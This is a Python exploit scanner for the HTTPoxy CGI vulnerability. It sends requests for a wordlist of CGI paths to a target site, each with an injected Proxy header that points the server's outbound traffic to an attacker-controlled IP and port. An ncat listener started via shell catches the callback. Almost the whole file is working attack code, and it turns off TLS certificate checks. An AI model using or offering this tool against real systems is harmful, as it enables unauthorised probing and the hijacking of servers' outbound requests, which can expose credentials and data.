#!/usr/bin/python
# HTTPoxy Exploit Scanner by 1N3 @CrowdShield
# Last Updated: 20160720
# https://crowdshield.com
#
# ABOUT: PoC/Exploit scanner to scan common CGI files on a target URL for the HTTPoxy vulnerability. Httpoxy is a set of vulnerabilities that affect application code running in CGI, or CGI-like environments. For more details, go to https://httpoxy.org.
#
# REQUIREMENTS: requires ncat to establish reverse session
#
# USAGE: ./httpoxyscan.py https://target.com cgi_list.txt 10.1.2.243 3000
# *** This will scan https://target.com with a list of common CGI files while injecting a Proxy header back to a given IP:PORT. A reverse listener will catch the incoming connection to confirm the remote site is vulnerable.
#
# DISCLAIMER: I take no responsibility for wrong doing or misuse of this exploit.
#

import urllib, urllib2, sys, getopt, requests, ssl, time, sys, subprocess, os
from array import *
from subprocess import call

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
def main(argv):
    argc = len(argv)
    if argc < 5:
	print bcolors.OKBLUE + "         _____  _____  ___                __                 " + bcolors.ENDC
	print bcolors.OKBLUE + "  /\  /\/__   \/__   \/ _ \_____  ___   _/ _\ ___ __ _ _ __  " + bcolors.ENDC
	print bcolors.OKBLUE + " / /_/ /  / /\/  / /\/ /_)/ _ \ \/ / | | \ \ / __/ _` | '_ \ " + bcolors.ENDC
	print bcolors.OKBLUE + "/ __  /  / /    / / / ___/ (_) >  <| |_| |\ \ (_| (_| | | | |" + bcolors.ENDC
	print bcolors.OKBLUE + "\/ /_/   \/     \/  \/    \___/_/\_\\__, |\__/\___\__,_|_| |_|" + bcolors.ENDC
	print bcolors.OKBLUE + "                                    |___/                    " + bcolors.ENDC
	print bcolors.OKBLUE + "  HTTPoxy Exploit Scanner by 1N3 @ https://crowdshield.com" + bcolors.ENDC
	print bcolors.WARNING + "[*] Usage: %s http://target.com cgi_list.txt listener_ip listener_port" % (argv[0]) + bcolors.ENDC
	print ""
	sys.exit(0)

    url = argv[1] # SET TARGET URL
    wordlist = argv[2] # SET CGI WORDLIST
    listen_ip = argv[3] # SET LISTENER IP
    listen_port = argv[4] # SET LISTENER PORT
    
    print bcolors.OKBLUE + "         _____  _____  ___                __                 " + bcolors.ENDC
    print bcolors.OKBLUE + "  /\  /\/__   \/__   \/ _ \_____  ___   _/ _\ ___ __ _ _ __  " + bcolors.ENDC
    print bcolors.OKBLUE + " / /_/ /  / /\/  / /\/ /_)/ _ \ \/ / | | \ \ / __/ _` | '_ \ " + bcolors.ENDC
    print bcolors.OKBLUE + "/ __  /  / /    / / / ___/ (_) >  <| |_| |\ \ (_| (_| | | | |" + bcolors.ENDC
    print bcolors.OKBLUE + "\/ /_/   \/     \/  \/    \___/_/\_\\__, |\__/\___\__,_|_| |_|" + bcolors.ENDC
    print bcolors.OKBLUE + "                                    |___/                    " + bcolors.ENDC
    print bcolors.OKBLUE + " + -- --=[HTTPoxy Exploit Scanner by 1N3 @ https://crowdshield.com" + bcolors.ENDC
    print ""
    
    # READ IN CGI LIST ONE BY ONE AND APPEND TO URL
    num_lines = sum(1 for line in open(wordlist))
    f = open(wordlist)
    lines = f.readlines()
    cgi = f.read().splitlines()
    f.close()

    # START PROXY LISTENER
    print bcolors.WARNING + "[*] Scanning target: " + url
    cmd = 'bash listener.sh ' + listen_port
    os.system(cmd)
    time.sleep(3)
    print bcolors.WARNING + "[*] Scanning target: " + url + "" + bcolors.ENDC
    num = 0
    while num < num_lines:  
	# CONSTRUCT AND SEND REQUEST
	cgi_req = str(lines[num])
	req_url = url + cgi_req
	sys.stdout.write("[+] Sending request: " + req_url)
	req = urllib2.Request(req_url)
	req.add_header('Proxy', listen_ip + ":" + listen_port)
	req.add_header('User-Agent', 'HTTPoxyScan by 1N3')
	resp = urllib2.urlopen(req)
	content = resp.read()
	num += 1
	
    print bcolors.WARNING + "[*] Scan complete!" + bcolors.ENDC
    # KILL OFF ANY RUNNING NETCAT PIDS
    print bcolors.WARNING + "[*] Killing reverse listener..." + bcolors.ENDC
    time.sleep(5)
    cmd = 'killall ncat'
    os.system(cmd)
    bcolors.WARNING + "[*] Done!" + bcolors.ENDC
    
main(sys.argv)